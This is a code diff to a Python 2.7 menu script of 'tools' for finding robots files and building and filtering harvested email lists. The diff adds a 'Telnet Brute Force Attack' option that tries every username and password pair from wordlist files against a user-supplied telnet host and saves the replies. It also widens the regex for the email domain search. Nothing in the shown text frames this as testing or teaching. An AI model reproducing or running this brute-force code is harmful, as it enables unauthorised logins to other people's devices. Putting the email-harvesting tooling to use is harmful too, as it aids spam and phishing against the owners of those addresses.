@@ -1,4 +1,5 @@
 import requests
+import telnetlib
 import time
 import sys
 import re
@@ -13,6 +14,7 @@ def menu():
 2. robots find tools
 3. create email file tools
 4. find specific email in email file
+5. Telnet Brute Force Attack
 0. exit'''
     print_result(menu)
     
@@ -131,7 +133,7 @@ def create_email_file():
 
 def find_email():
     string = raw_input("Enter the domain you want to search for in email file >> ") # python 2.7
-    pattern = re.compile(".*@"+string+".*")
+    pattern = re.compile(".*@.*"+string+".*")
     
     email = open("email","r")
     result = open(string,"w")
@@ -152,6 +154,21 @@ def save_email(tmp1, tmp2,pattern):
         else:
             break
 
+def telnet_connect(host,user,password):
+    tn = telnetlib.Telnet(host)
+    tn.read_until("Username:")
+    tn.write(user+"\n")
+    tn.read_until("Password")
+    tn.write(password+"\n")
+    tn.read_some()
+
+    result = "ID : "+user+", Password :"+password
+    time.sleep(5)
+    result += tn.read_some()+"\n\n"
+    tn.close()
+
+    return result
+
 while(1):
     try:
         num = menu()
@@ -169,6 +186,24 @@ while(1):
             create_email_file()
         elif num==4:
             find_email()
+        elif num==5:
+            host = raw_input("telnet IP : ")
+            u = open("user","r")
+            p = open("Attack password","r")
+            result =""
+
+            user_list = u.read().split()
+            password_list = p.read().split()
+
+            for user in user_list:
+                for password in password_list:
+                    tmp  = telnet_connect(host,user,password)
+                    print(tmp)
+                    result += tmp
+            print(result)
+            save(host+"telnet",result)
+            u.close()
+            p.close()
         elif num==0:
             break
     except:
